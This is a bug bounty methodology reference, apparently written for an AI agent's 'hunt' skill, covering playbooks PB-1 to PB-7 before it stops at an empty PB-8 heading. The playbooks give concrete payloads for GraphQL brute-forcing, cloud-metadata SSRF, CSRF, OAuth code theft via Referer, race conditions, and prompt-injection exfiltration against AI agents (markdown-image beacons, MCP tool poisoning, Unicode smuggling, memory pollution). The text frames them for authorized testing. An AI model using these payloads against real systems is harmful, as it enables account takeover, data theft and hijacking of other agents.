# Reference — Bug Bounty Hunting Playbooks & Report-Quality Triage

Companion to the `hunt` skill (`../SKILL.md`). Covers: expanded method detail for the fourteen bug-bounty playbooks (PB-1–PB-14), program-scope and report-quality triage detail, provenance caveats, and FP-rule refinements.

All techniques are for authorized testing only — targets named in the scope manifest, entitled labs, or programs whose written policy permits the technique. Step gates (G0–G3) are defined in `../../safety-gates`; this reference adds the method depth beneath those gates. Report triage and harm-gate mechanics point at `../../reporter`. Where a source is self-published or partially unverifiable, that is stated — no technique is asserted beyond what its source documents.

---

# PART 1 — PLAYBOOK EXPANSIONS (PB-1–PB-14)

## PB-1 — GraphQL: introspection-to-takeover

**Provenance:** The XSS Rat / Wesley Thijs, "GraphQL Is a Gift to Bug Hunters — Introspection-to-Takeover Workflow" (2026-11-10), corroborated with PortSwigger, HackTricks, and OWASP material cited within it. The author's standing rule: run everything against "targets you own, deliberately-vulnerable labs, or programs where you have written permission" — aliased brute-force "against someone else's login is a crime, not a flex".

### Expanded method

**Discovery:**
- Candidate paths: `/graphql`, `/graphiql`, `/graphql.php`, `/graphql/console`, `/api`, `/api/graphql`, `/graphql/api`, `/graphql/graphql` plus `/v1` variants.
- Universal probe (works where other probes 404): `POST {"query":"query{__typename}"}` — any body containing `"data":{"__typename":"query"}` confirms GraphQL.
- Grep loaded JS bundles for `mutation`/`query` fragments to find hidden endpoints.
- Fingerprint the engine (graphw00f: Apollo vs graphql-java vs ruby) — bypass behavior and suggestion errors differ per implementation.

**Introspection:**
- Quick probe: `{"query":"{__schema{queryType{name}}}"}`.
- Full standard query: `query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } } }` — the `onOperation`/`onFragment`/`onField` directive declarations "often need to be deleted to run" (PortSwigger).
- Feed the dump to InQL or GraphQL Voyager for an entity map.

**Introspection-blocked bypasses:**
- Regex blocks usually cover only the literal `__schema{` — insert parser-ignored characters: `{"query":"query{__schema\n{queryType{name}}}"}`.
- Retry as GET (`GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D`) and as `x-www-form-urlencoded` POST — blocks frequently cover only JSON POST bodies.

**Schema recovery without introspection:**
- Request a nonsense field (`usr`) and harvest the Apollo suggestion error — OWASP quotes the shape `Did you mean "user?"`.
- Automate: `pip install clairvoyance && clairvoyance https://target/graphql -o schema.json` (Docker: `docker run --rm nikitastupin/clairvoyance`) with Escape-Technologies/graphql-wordlist or google-10000-english. InQL v6.1+ batches candidate fields against suggestion errors.

**Schema reading → access control:**
- Enumerate every Mutation + input args; check Relay fields: `cat schema.json | jq '.data.__schema.types[] | select(.name=="Query") | .fields[].name' | grep node`.
- Probe object-level auth with two of your own accounts: PortSwigger's `query { product(id: 3) { id name listed } }` shape (delisted object) and cross-account `updateProfile(username:...)` mutations. Auth wired "to the front door" but forgotten per-resolver is the BOLA/ATO pivot.

**Abuse primitives — authorized targets only:**
- Aliased single-POST shape: `mutation{bruteforce0:login(input:{username:"...",password:"..."}){token success}}` … `bruteforce99:...` — delete the `variables` dict and `operationName`; search the response for the alias returning `true`/a token. Request-count rate limiters are architecturally defeated by aliases and JSON-array batching (`[{"query":"..."},{"query":"..."}]`). **Gate note:** the credential-guessing variant is prohibited on live targets by the safety gates (`../../safety-gates`) — demonstrate limiter bypass with harmless aliased operations on authorized targets and practice the credential variant only in labs (e.g., PortSwigger race/GraphQL labs). Scope-proof (the program-policy line permitting credential attacks) must accompany any such evidence or the report is dead on triage.
- GET-mutation check: `curl -G https://target/graphql --data-urlencode 'query=mutation{updateEmail(email:"attacker-owned@example.com"){id}}'` — against your own test account.
- ATO candidates = identity mutations: password-reset, email-change, OTP, token-issuance — especially arbitrary `username`/`email` args (one-POST takeover).

**Tooling:** Burp Repeater ("Send group in parallel" for race variants), clairvoyance, InQL (`python3 inql.py -t <url> -o output.json`), GraphQLmap (`python3 graphql-map.py --url <url>`), graphql-cop (misconfig scan: introspection on, GET executes mutations, GraphiQL exposed), graphw00f, GraphQL Voyager (spot `node`, federation `_service{sdl}`, cross-type paths worth auth-testing), HackTricks endpoint path list.

**Evidence requirements:** full request/response pairs; the schema map excerpt showing the exposed sensitive surface; per-account access-control diff (account A vs B).

**FP-rule refinement (extends the GraphQL rule in the FP rules below):** introspection/schema visibility is not automatically a vulnerability — price by what the map exposes. Conversely, a 200 with an errors array is where access-control bugs hide — read error bodies, not status codes; a successful aliased/batched response requires committed-state verification, not response parsing alone.

## PB-2 — AI agent tool abuse (confused deputy)

**When it applies:** any application embedding an LLM/agent with registered tools, retrieval, or fetch capability — chat assistants, copilots, agentic workflows, MCP-connected toolchains. **Priority-tier — co-priority with PB-12:** AI-target vulnerabilities are the top-EV class of 2026 — platform-reported figures put prompt-injection reports up ~540% year-over-year, flagship AI program awards at $15,000–$172,000, and only ~12% of top AI firms running a disclosure program at all. Treat those as prioritization data, not a per-program guarantee (same hedge as PB-12's payout-per-effort ranking) — but the attacker-defender gap makes in-scope AI surface the least-crowded high-tier hunting, so run this class alongside PB-12's deterministic object-diff whenever the target exposes agent surface.

**Provenance:** Vignesh Kumar, "How I Hunt for Bugs in AI Agent Tools", vendor-doc-verified metadata probes. Framing references: Simon Willison's "lethal trifecta" (private data + untrusted content + external communication) and OWASP GenAI LLM06:2025 Excessive Agency. New-class references: the EchoLeak-class zero-click markdown exfiltration disclosures (CVE-2025-32711, Microsoft 365 Copilot), Invariant Labs' MCP tool-poisoning / rug-pull / cross-server-shadowing publications, and Unicode tag-block smuggling research.

### Expanded method

**Capability map:** locate the tool-registration list (article's shape: `Agent(model=model, tools=[read_source_code_file, fetch_url, run_shell, query_db])`); per tool record WHAT resource it touches (filesystem, network, shell, DB, cloud API, anything that sends — email/webhooks/payments) and WHAT privilege it runs with. Star tools with ambient authority over sensitive resources.

**Input map:** direct input; retrieved documents (the RAG index is itself an input surface); job files the agent reads (requirements.md, issues, READMEs, configs); fetched web pages/API responses; tool outputs fed back into context. To the model these are just tokens — that is the indirect-prompt-injection steering mechanism.

**Sink matching:** reads a path → CWE-22; fetches a URL → CWE-918 (especially toward cloud metadata); runs a command → CWE-78; queries a DB → CWE-89/CWE-639; renders a template → SSTI/XSS; parses serialized data → insecure deserialization. "The LLM invents no new bug classes — it is the old sink with a model holding the pen."

**Reading tools for absences (high-yield):**
- File tool: is the path resolved/confined to a root, or does it `open()` whatever string it's handed? Comparing resolved paths (e.g., `Path.resolve()` on both sides) is the fix; filtering `..` from input is bypassable.
- URL tool: host allowlist? Private/link-local blocking **after DNS resolution**? Blind redirects?
- Command tool: `shell=True` or string concat?
- Query tool: parameterized statements; caller identity vs god-mode service account.
- Docs-vs-code gap: the reference case's AWS tool threat model claimed "bounded, read-only filesystem access" while code enforced nothing.
- Unused safe sibling: a neighboring package resolved every path through `_resolve_safe()`; the vulnerable `read_source_code_file` never called it. Reference vulnerable shape: `read_source_code_file(file_path: str, max_lines: int = 200)` with `Path(file_path)` + `p.read_text(...)` and no confinement.

**Direct sink PoC (no model in the loop):**
- `python -c "from the_tool import read_source_code_file; print(read_source_code_file('/etc/passwd')[:200])"` — or, for the honest variant, read a benign file you planted outside the project (`/tmp/outside-project/secret.txt` containing `FAKE_TOKEN=not-a-real-key`). Deterministic, no credentials, no cloud account. **Never exfiltrate real secrets** (see `../../safety-gates`).

**Cloud metadata probes (vendor-doc verified):**
- AWS IMDSv1: plain GET `http://169.254.169.254/latest/meta-data/`; IMDSv2: `curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` then `curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/` (401 without token when required; IPv6 `fd00:ec2::254`; PUT carrying X-Forwarded-For rejected).
- GCP: `curl "http://metadata.google.internal/computeMetadata/v1/instance/image" -H "Metadata-Flavor: Google"` (alt: `http://169.254.169.254/computeMetadata/v1`, `http://[fd20:ce::254]/computeMetadata/v1`; denied without the header; X-Forwarded-For rejected).
- Azure: `curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2025-04-07"` (requires `Metadata: true`, must NOT carry X-Forwarded-For; managed-identity tokens at `/metadata/identity`).

**URL-filter bypass shapes (PortSwigger, per the digest):** blacklist — `127.0.0.1` encodings (2130706433, 017700000001, 127.1), a domain you register resolving to 127.0.0.1, URL-encoding/case variation, http→https redirect switch; whitelist — parser inconsistencies `https://expected-host:fakepassword@evil-host`, `https://evil-host#expected-host`, `https://expected-host.evil-host`. **Caveat:** the PortSwigger payload wordlists were JS-rendered and could not be extracted in the research pass — only the page skeleton was retrievable; use the named shapes, not a claimed full wordlist.

**Indirect-injection chains [G2, owned context only]:**
- Delivery: plant canary data in context the agent reads — a doc in your own RAG workspace, mail to your own test mailbox, a page you host, a tool output you control — then craft content that coerces the agent into emitting the canary to an OAST-correlated endpoint.
- Auto-fetch exfil (EchoLeak class): markdown images/links the agent's renderer fetches without a click — `![x](https://<oast>/?d=<canary>)`; where inline URLs are redacted, reference-style link syntax (`[x][1]` plus a later `[1]: https://<oast>/...`) bypasses filters that only scan inline destinations.
- CSP laundering: a CSP-allowlisted endpoint (analytics, telemetry, error-reporting host) carrying the canary in its query string is an exfil proxy the page policy permits — enumerate `connect-src`/`img-src` allowlists as the egress map. Strongest variant: allowlisted domains the attacker can host content on (`*.blob.core.windows.net` uploads, `*.teams.microsoft.com`-class tenant content, `*.googleusercontent.com` storage/user-content hosts) — the policy permits the domain, the attacker controls the path.
- Primitive: the OAST hit carrying the canary is the deterministic signal; the agent's claimed compliance is not.

**MCP/tooling surface [G2]:**
- Tool-poisoned descriptions: hidden directives embedded in the tool description itself (`<IMPORTANT>`-style blocks telling the model to read extra files or relay parameters to an attacker path) — audit tool metadata as an injection channel, not just the tool code.
- Rug pulls: the description mutates after the user approves the tool list — re-diff advertised versus live descriptions across sessions.
- Cross-server shadowing: one server's tool description redirects another server's parameters — test multi-server compositions, not each server alone.
- Transport and authorization: unauthenticated SSE/HTTP transports, sessions not bound to the initiating principal, and tool-call authorization gaps where the agent's ambient credentials execute what the caller's role could not (AIX-03, `check-catalogue.md`).

**Rogue-action escalation [G3]:**
- The paying classes are consequences: cross-account data exfiltration, unauthorized tool execution, state changes, code execution via the agent's own tools — the starred ambient-authority tools from the capability map (shell, fetch, file-write, email, payment).
- Demonstrate the executed action against your own fixtures: the OAST hit, the second test account's committed state change, the planted canary file written or sent. Stop at the minimal demonstrated consequence per `../../safety-gates`.
- A "prompt injection worked" transcript alone is informational — the observed effect is the finding; the transcript is narration.

**Unicode/encoding channels [G2]:**
- Invisible-payload classes for injection delivery and exfil marking: Unicode tag-block characters (U+E0000–E007F encode ASCII as invisible glyphs), zero-width binary (ZWSP/ZWNJ runs), variation-selector smuggling (VS1–VS16).
- Decoding is provider-asymmetric — a payload invisible in one stack's renderer can still reach the model's tokenizer, and vice versa: test both the rendered and the raw-text channel per provider.
- Non-Unicode invisible channels: HTML comments the renderer strips but the model reads (`<!-- ... -->` in retrieved docs), white-on-white text, 0-pixel images with hostile alt/filename, text present only inside screenshots/attachments the model OCRs — the hidden layer targets the model's tokenizer where the human sees a clean page.
- Memory pollution: where the agent exposes a persistent memory/store tool, injected instructions that write to memory convert one retrieved-doc injection into a durable hijack surviving the session — test whether a planted fact or directive recurs in later fresh-context runs.

**Target selection:** AI-in-scope programs are the fastest-growing segment — before hunting, check the manifest's `authorized_assets` for AI surface and `automation_policy` (`ai_output`, `ai_disclosure` — `../../scope-parser`), plus the program's own AI rules: Microsoft excludes self-only injection and system-prompt leakage; Google AI VRP pays on rogue-action/exfiltration tiers. Published payout tiers for prioritization: Google AI VRP tops at $20,000 for rogue-action classes and $15,000 for exfiltration classes; Microsoft Copilot awards run $250–$30,000 with a zero-click chain rated Critical; OpenAI pays up to $172,000; 0DIN pays $5,000–$15,000 for execute-class agent findings. Pair with the AIX-01–AIX-07 coverage checks (`check-catalogue.md`).

**Fix pattern (the reference fix shipped with regression tests for traversal, absolute paths, symlink escape):** resolve project root; resolve the requested path with `Path.resolve()` (follows symlinks, closing the symlink-pointing-outside escape); reject anything not inside the root — comparing **resolved** paths, not strings.

**Evidence bar:** the planted canary value side-by-side with the OAST capture that carried it out (full request/response pairs both directions); the injected content exactly as the agent ingested it; the observed rogue action — committed-state diff, executed-tool log — not the transcript claim. Store per `../../evidence`.

**FP-rule refinement:** a tool accepting a traversal path in code review is a finding only when the tool actually runs with ambient authority — prove the sink with the direct call; a model *declining* in conversation is not evidence the boundary exists ("a security boundary should never depend on the model choosing to decline"). Symmetrically, a model *complying* in conversation is not evidence of impact — prompt-injection success without an executed action (no OAST hit, no committed state change, no tool call fired) is informational on flagship programs. The recurring FP kill-list: self-injection (the injected content only ever reached your own session/context — no cross-principal path shown); prompt-leak-without-action (system-prompt disclosure is excluded by Microsoft and informational elsewhere unless the prompt itself carries secrets); hallucination-without-effect (a wrong or manipulated answer is a safety bug, not a security bug); sandbox-intended execution (code ran inside the documented sandbox boundary it was designed for); victim-config dependence (the chain requires the victim's non-default configuration — a downgrade rung, often a kill); and Microsoft's no-security-impact exclusion — injection producing no security consequence is out of scope regardless of how reliably it fires.

## PB-3 — WebSocket event protocols and captcha-gated agent endpoints

**Provenance caveat (verbatim from the digest):** self-published writeup with an anonymized target — the author's own report, not independently verified; the printed CVSS vector is a placeholder ("AV/AC/PR/UI/S/C/I/A"), not a valid CVSS string — recompute your own. Generalize the method, re-verify every step on your target.

### Expanded method

1. **Connect unauthenticated and enumerate the protocol from the handshake:** `wscat -c "wss://<host>/ws?app_type=web&origin_domain=<configured>&origin_shop=<configured>"` → `connection_established` with `session_id`, `timestamp`, `turnstile_site_key` — the site key reveals the gate and hands over the client widget config.
2. **Baseline the gate:** send `{"event":"system_prompt","action":"get"}` immediately after connect; capture the denial `{"event":"error","payload":{"type":"auth_required","code":403,...}}`.
3. **Null-token bypass on the same socket:** `{"event":"captcha_verify","payload":{"token":""}}` → `{"event":"captcha_result","payload":{"success":true}}` — backend treats the client-submitted event itself as proof instead of calling the verification API.
4. **Token-fuzz matrix:** same event with `"AAAA-not-a-real-captcha-token"`, whitespace `" "`, and payload key omitted — variants passing means no token validation exists at all.
5. **Re-send the privileged event:** the previously-403'd event returns the system prompt and tool catalogue; bypassing the model's conversational "never reveal" guardrails because this is a **dedicated server event**. Classification: OWASP GenAI LLM07:2025 System Prompt Leakage (MITRE ATLAS AML.T0051.000).
6. **Know the correct control** (Cloudflare docs): backend must POST `https://challenges.cloudflare.com/turnstile/v0/siteverify` with secret + response (+ optional remoteip); tokens max 2048 chars, valid 300 s, single-use (reuse/expiry → `timeout-or-duplicate`; garbage → `invalid-input-response`); check the response `hostname` and `action` fields.
7. **Replay across every production deployment** of the same verification layer — systemic vs one-off.
8. **Generalize:** grep client JS bundles and live WS traffic for event names like `captcha_verify`, `guest`, `system_prompt`; hunt "client asserts it passed verification, server believes it" everywhere, not just CAPTCHA widgets.

**Tooling:** wscat (`sudo npm install -g wscat`), browser DevTools WS frame inspector (Network → WS) for the event vocabulary, the siteverify API contract as the named missing control.

**FP-rule refinement:** a successful WS handshake does not demonstrate authorization failure (existing rule); a rendered CAPTCHA widget is likewise not enforcement — the server-side siteverify decision is the control. Baseline-before-bypass (403 → success → disclosure on the same socket) is the airtight before/after diff that survives triage disputes.

**Boundary:** demonstrate the absence of server-side validation only. No challenge-solving automation, no third-party verification tampering, no evasion.

## PB-4 — Race conditions: single-endpoint TOCTOU and HTTP/2 single-packet

**Provenance:** [Shahzad-Race] — Facebook 2016 case study of Josip Franjković's contact-point confirmation race. [T4nv1] — "$10,000 single-packet race" writeup; **body member-only** — the verified intro names "HTTP/2 frame multiplexing and the Single-Packet Attack (TCP sync head-of-line blocking)" → "a high-concurrency state window bypass on a financial SaaS platform"; the technique below is reconstructed from corroborating public sources (PortSwigger race-conditions material, Kettle's "Smashing the state machine", Turbo Intruder docs, flatt.tech); the LB-doing-TLS-termination + H2→H1.1-translation detail is search-reconstructed, medium confidence. **Fact-check note:** the "~1,500-byte TCP soft limit" sometimes quoted is an Ethernet-MTU/MSS inference — the fetched sources state only "up to 20-30 HTTP requests with a single packet" (Kettle, who suggests "forcing the maximum segment size up") and frame first-sequence-sync against the 65,535-byte TCP limit; do not cite 1,500 bytes as sourced.

### A — Single-endpoint TOCTOU on identity flows

1. Recon: identify the endpoint writing the pending contact point and the one consuming the confirmation secret; the smell is a pending-value write not serialized against token issuance/consumption.
2. Test account + API token; two values: an owned mailbox + an unused address you legally control and receive no mail at (never a third party's real address).
3. Capture the exact write request; learn parameter anatomy from a real confirmation email to your own address (2016 shape: `/confirmemail.php?e=<email>&c=<your-email-code>&code=<confirm-code>` — `c` is always the owned address's code while `code` confirms whichever address won the race).
4. [G3] Fire simultaneous requests to the write endpoint, alternating the contact value between the two addresses, in tight batches, looping within budget — discovery took ~5,000 requests historically; the reproducible PoC came from batching simultaneous alternating requests (Burp Repeater group "Send group in parallel"; Burp ≥ 2023.9).
5. Harvest the cross-boundary artifact in the owned mailbox; redeem it to mark the unused address confirmed without ever receiving mail there.
6. Capture interleaving evidence + full request/response pairs — a sibling reporter explicitly warned to attach full POST requests and responses or triage cannot reproduce.
7. Defense-side test (the case's own remediation, executable): submit two distinct contact values simultaneously, assert each confirmation secret confirms only itself. Implementation pattern: store `{account, purpose, normalized contact}` on the token; `SELECT ... FOR UPDATE` on token and account rows in one transaction; increment the attempts counter; verify with `hmac.compare_digest`; commit; **only THEN raise** (raising inside the transaction rolls back the counter). General rule: "two overlapping updates must not retarget an in-flight token".

Prior art from the same source: Keybase invite-limit bypass (hackerone.com/reports/115007), Keybase multi-registration with one invite (148609), Cobalt.io BTC withdrawal reuse, Facebook ad-coupon one-per-account race, Mega.nz coupon reuse.

### B — HTTP/2 single-packet race [G3 throughout]

- **Mechanics:** one HTTP/2 connection; send every request withholding a tiny final fragment so none starts processing; release all at once — the OS groups them into one TCP packet and the server processes them "at the same time, regardless of how much network jitter delayed their delivery". HTTP/1.1 pipelining fails (requests "have to be sequential").
- **Withhold semantics:** withholding END_STREAM alone "will break on certain HTTP/2 server implementations that use the content-length header" — hold back a DATA fragment per stream; disable TCP_NODELAY (Nagle batches final frames); send a PING first to warm the connection.
- **Turbo Intruder:** `RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)`; queue ~20 requests with `engine.queue(target.req, gate='race1')`; release with `engine.openGate('race1')` — "All gated requests are sent in a single TCP packet". Base script `resources/examples/race-single-packet-attack.py`; manual equivalent = Burp Repeater tab groups. Diagnostics: `req.order` ranks responses (0 = first); "A negative timestamp in results indicates the server responded before the request was fully sent".
- **Front-end mismatch:** front-ends "may decide to forward some requests over existing connections to the back-end, and to create fresh connections for others" — do server-side connection warming (a few inconsequential requests first) to pin a stable backend path; front-end routing is often per-connection. The exploitable "mismatch" is where front-end enforcement (TLS termination, H2→H1.1 translation, counting) and backend reality diverge.
- **Concurrency ceiling:** respect `SETTINGS_MAX_CONCURRENT_STREAMS` — Apache httpd 100, Nginx 128, Go 250, nghttp2/Node.js 4294967295 (RFC 9113 initial unlimited, recommended ≥100); exceeding yields PROTOCOL_ERROR or REFUSED_STREAM (auto-retryable).
- **Scaling — first-sequence sync (laboratory only):** IP fragmentation (RFC 791 — reassembly only when all fragments arrive) to withhold the packet carrying the FIRST sequence number; the server buffers out-of-order traffic and processes it at once when the missing fragment lands. Reference: github.com/Ry0taK/first-sequence-sync (rc-benchmark, rc-pin-bypass) — 10,000 requests in ~166 ms; 1,000 guesses against a 5-attempt limit; suppress RSTs with `iptables -A OUTPUT -p tcp --tcp-flags RST RST -s <IP> -j DROP`.
- **Fallbacks:** no HTTP/2 → last-byte sync, `Engine.THREADED`/`Engine.BURP`, `concurrentConnections=20` (~4 ms median spread vs ~1 ms single-packet; hours vs ~30 s on a real target). HTTP/3 → `Engine.HTTP3`, `gateMode` auto/'sda'/'qpack'. Prepend a connection-warming GET to separate back-end connection delay from endpoint processing delay; if the server serializes per session (PHP session lock), resend each request with a different session token.
- **Flow-control physics:** only DATA frames count against the window; initial window 65,535 octets; `SETTINGS_INITIAL_WINDOW_SIZE` (0x04); endpoints MUST process frames from the TCP receive buffer as soon as available (RFC 9113 §5.2.2).

**Evidence bar:** per-request response order/timestamps and the exact engine config — sync quality is the evidence, never "sometimes it worked". Two successful HTTP responses do not establish two committed business operations (existing FP rule) — add committed-state inspection (the confirmed flag, the double credit, the second redemption) as the impact artifact. Target classes: rate limits, OTP/verification, coupon/fund redemption.

## PB-5 — SAML assertion confusion

**Provenance:** Slack / Sanso disclosure (blog.intothesymmetry.com/2017/10/slack-saml-authentication-bypass.html), $3,000; reported 02-05-2017, confirmed 03-05-2017, bounty 26-08-2017, closed 26-10-2017 (~6 months) — timeline verified verbatim. **Fact-check-corrected attribution:** Sanso's motivation was Ioannis Kakavas — "a serious vulnerability in the SAML implementation of Microsoft and Github"; "The Github incident gave me the final motivation to start learning it". His post never mentions SSOCircle — do not repeat that attribution. **Reconstruction caveat:** neither the post nor the TechTarget analysis discloses how the GitHub-signed assertion passed Slack's signature verification, and no raw request/response was published — only the endpoint, the tool, and the failed checks are public.

### Expanded method

1. **Checklist (OWASP SAML Security Cheat Sheet):** Audience vs SP EntityID; Destination vs ACS URL; Recipient/InResponseTo/SubjectConfirmationData; NotBefore/NotOnOrAfter; signature ≥ RSA-SHA256; signature-reference coverage; static key pinning (ignore KeyInfo).
2. **Archive:** capture and archive every SAMLResponse you legitimately receive — the exploit material was "an old and expired Github's Assertion I had saved somewhere in my archive"; expired/foreign-SP material is valid test input.
3. **Inventory:** SAML-enabled services you hold accounts on; prioritize in-scope ones. Slack reference ACS: `https://<workspace>.slack.com/sso/saml` (Enterprise Grid: `https://<org>.enterprise.slack.com/sso/saml`); audience/EntityID `https://slack.com` (confirmed via Slack's own help article).
4. **Replay [G3]:** POST the saved foreign-SP/expired assertion in the `SAMLResponse` field to the target ACS; observe whether a session is issued and as which subject. The Slack case accepted an **expired** assertion scoped to **GitHub** ("yes the assertion was also expired!!") and named a subject that was not the reporter ("the username was not asanso aka me").
5. **Single-variable isolation [G3]:** if rejected, mutate one condition at a time (Audience only, Destination only, timestamps only) to map which checks exist — the failing-check matrix equals the remediation test list.
6. **Replay/duplicate + unsolicited [G3]:** resubmit the identical assertion twice — the SP must consume assertion IDs in a committed transaction BEFORE issuing the session (OWASP, per SAML Profiles 4.1.5); submit an IdP-initiated response with no InResponseTo and verify response/assertion-level replay detection.
7. **XSW [G3]:** SAML Raider's 8 one-click XML Signature Wrapping variants; verify the `ds:Reference` URI covers the assertion actually used for authentication; reject assertions outside the signed content.
8. **Stop at proof:** "I stopped quite immediately and open a ticket on Hackerone" — file each failing check separately.

**Tooling:** SAML Raider (CompassSecurity; BApp Store id c61cfa893bb14db4b01775554f7b802e — sign/remove/edit, X.509 import/export/clone/self-sign, 8 XSW variants, XML/Base64 editor); Burp Repeater ACS probes; personal saved-assertion archive.

**FP-rule refinement:** a signed assertion replayed is not a finding until the SP issues a session — capture the issued session and its subject as the impact artifact. Anchor lesson: "A signature proves who issued the assertion, not that it was minted for you." Independent failed checks compound — enumerate each separately. Enterprise SSO remediation is slow: next-day confirmation, ~6 months to close.

## PB-6 — CSRF: token issued, never validated

**Provenance:** Whitton's Messenger.com site-wide CSRF + Mazin Ahmed's June 2015 PoCs. Confirmed case: `POST https://www.messenger.com/settings/edit/` body `settings[sound_enabled]=false&__a=1` with NO `fb_dtsg` → 200 OK, normal payload — setting changed.

### Expanded method

1. Identify the token param + companions (`fb_dtsg`, `__user`, `__a=1`, `__dyn`, `__req`, `ttstamp`, `__rev`); record normal success.
2. Learn the failure signature first: the reference app redirected to `/common/invalid_request.php` or errored (depending on the `__a=1` AJAX flag) when validation fired — normal success JSON after tampering = the check does not exist. This is your oracle for "check fired" vs "no check".
3. Five-variant tamper matrix per captured request: (1) send normally; (2) remove the ENTIRE token parameter (PortSwigger: "remove the entire parameter containing the token (not just its value)"); (3) alter one character, same length; (4) empty the value keeping the param; (5) POST→GET (GET must never mutate data). Any variant matching step 1 = likely vulnerable.
4. Strongest artifact: identical 200 OK success JSON with the token fully deleted.
5. Scope: repeat on several distinct mutating endpoints (`/chat/remove_participants/` shape in the source) → site-wide middleware absence vs endpoint-scoped; conclude "missing on every request" after 2–3 all-pass, then test high-value routes for impact.
6. Cross-site PoC (Mazin Ahmed shapes, owned victim sessions only): auto-submitting form `<body onload="javascript:document.csrf_form.submit()">` POSTing attacker-chosen message content / thread deletion / settings flips to your own second account.
7. Validated-token escalation variants (PortSwigger): method-dependent validation (checked on POST, skipped on GET); token not tied to the session (global pool — use your own valid token in the attack); token bound to a non-session cookie (plant your csrfKey via a sibling subdomain you own); double-submit in a cookie (invent matching parameter+cookie values).
8. Login CSRF (pairs with PB-7 step 8): forgeable cross-site GET to login/OAuth start silently logging your own test victim into your own attacker account; provider-side `state` protection stays intact.
9. Fix verification: re-run the full matrix post-fix ("tokens are now properly checked on every request" was the confirmed fix). Ship the remediation: default-deny token enforcement in shared middleware with reviewed opt-outs; constant-time comparison where missing/empty fail identically to wrong; no state changes over GET/HEAD; layered SameSite + Origin/Sec-Fetch-Site checks; CI regression tests asserting the negative cases per mutating route ("a CSRF suite that only checks success proves nothing").

**FP-rule refinement (inverse of the existing rule):** a missing explicit token is not always exploitable (existing) — AND a present token is not proof of validation: prove enforcement with the tamper matrix plus the app's expected failure signature.

## PB-7 — OAuth code/token leakage, redirect validation, and low-severity chaining to private-repo takeover

**Provenance:** GitHub 2014 chain reconstructed from Egor Homakov's original disclosure ("How I hacked Github again", Feb 7 2014) — the case study that summarized it is AI-assisted and credits Homakov for all facts; Airbnb chain from Arne Swinnen's 2016 disclosure ($5,000, awarded 27/09/2016). The app IDs and URLs below are 2016 registered values from the disclosure — historical, cited as disclosed.

### GitHub-2014 chain shapes

- **Redirect validation bypass:** `https://github.com/login/oauth/authorize?client_id=7e0a3cd836d3e544dbd9&redirect_uri=https%3A%2F%2Fgist.github.com%2Fauth%2Fgithub%2Fcallback/../../../homakov/8820324&response_type=code` — a "path must be a subdirectory of the callback" check passes while the browser normalizes the Location to an attacker-reachable URL on the same origin.
- **Code-binding test:** RFC 6749 §4.1.3 — redirect_uri at the token endpoint "MUST be identical" to the authorization request; §4.1.2 binds the code to "the client identifier and redirection URI". Exchange: `POST https://github.com/login/oauth/access_token` with `client_id, client_secret, code, redirect_uri` (default form-encoded response); codes expire in ~10 minutes per current GitHub docs — redemption must be immediate.
- **Referer-based code exfiltration:** inject `<img src="///attacker-site.com/logo.png">` into user content on the callback origin — the triple-slash URL parses as path-relative to Ruby's URI library (passing the Camo proxy) while Chrome/Firefox treat it as protocol-relative, so the victim's browser fetches the attacker host with the leaked `?code=` in the Referer. Script-less, NoScript-proof. Observe via a logging endpoint or Burp Collaborator.
- **Silent scope escalation:** append `&scope=repo,gists,user,delete_repo,notifications` to the crafted authorize URL — 2014 GitHub auto-approved any scope for pre-approved official clients with no consent prompt, upgrading a gists-only token to full private-repo read/write. Scope semantics are the impact multiplier: `repo` = "full access to public and private repositories including read and write access to code" — private-code write access is supply-chain risk.
- **Session takeover:** `GET https://gist.github.com/auth/github/callback?code=CODE` establishes a logged-in session as the victim.
- **Token extraction from session cookies:** Base64-decode the Rails `_*_session` cookie → Ruby `Marshal.load` surfaces the raw provider token inside the signed (not encrypted) session. Rails 5.2+ encrypted cookies and server-side stores close this.
- **Modern detection angles (GitHub docs):** exact-match redirect is the default; wildcard matching is opt-in and explicitly warned to "allow an attacker to send authorization codes to any subdomain or subdirectory of the callback URL"; omitting `scope` for returning users issues a token combining all previously authorized scopes and "the authorization prompt is skipped" — test both; verify PKCE enforcement (S256-only, 43-char verifier; `plain` unsupported; `state` strongly recommended).

### Airbnb-2016 chain shapes

- **Referer-driven post-OAuth redirect:** from an attacker page embed `<object data="https://<target>/oauth_connect?from=google_login&service=google">`; when the victim is already logged in, the callback redirects to wherever the initiating request's Referer points. Only `/oauth_connect`/`/oauth_callback` were affected; `/authenticate` and the `redirect_params` controller were NOT — map the exact triggering path first.
- **Login-CSRF planting:** the same embedded object fires a forgeable cross-site GET that silently logs the victim into the ATTACKER'S own account, storing the attacker-controlled Referer as the victim's return address. Provider-side `state` stays intact — the callback URI is never modified.
- **response_type substitution:** send the victim to the provider auth URL with `response_type=code,token` instead of `code`, redirect_uri byte-identical — tokens arrive in `location.hash`, readable by any origin's JS after redirects. Capture page: `if (window.location.hash) { alert(window.location.hash); window.stop(); }` plus the object-switch chain for the login-CSRF step.
- **Monetize both token types:** the untouched redirect_uri means the `code` still exchanges for a web session as the victim (demonstrated in the PoC video). The writeup describes the mobile path — the app "did use an identity provider's long-term access_token to authenticate a user transparently under the hood" and swapping the stored token on a rooted phone would authenticate as the victim — **but a performed rooted-phone demo is not explicitly described; verify each token's impact separately.**
- **Server-side fixes (the writeup's own analysis):** never derive redirects from Referer — persist the return path server-side at flow start and validate relative-only (`starts with '/'`, `not '//'`), allowlist-prefixed; reject OAuth initiation when `Sec-Fetch-Site` is `cross-site` and bind `state` to a pre-session cookie the attacker cannot set; treat `response_type=token` fragments at a code-expecting callback as an anomaly and terminate WITHOUT redirecting; stop accepting bare IdP access_tokens as mobile login — use PKCE with backend code exchange.

**FP-rule refinement:** a code appearing in a Referer is not leakage until it lands on attacker-controlled logging; a captured code must be shown redeemable (token exchange or session) to count as impact.

## PB-8 — SSO audience confusion and upload-parser reach

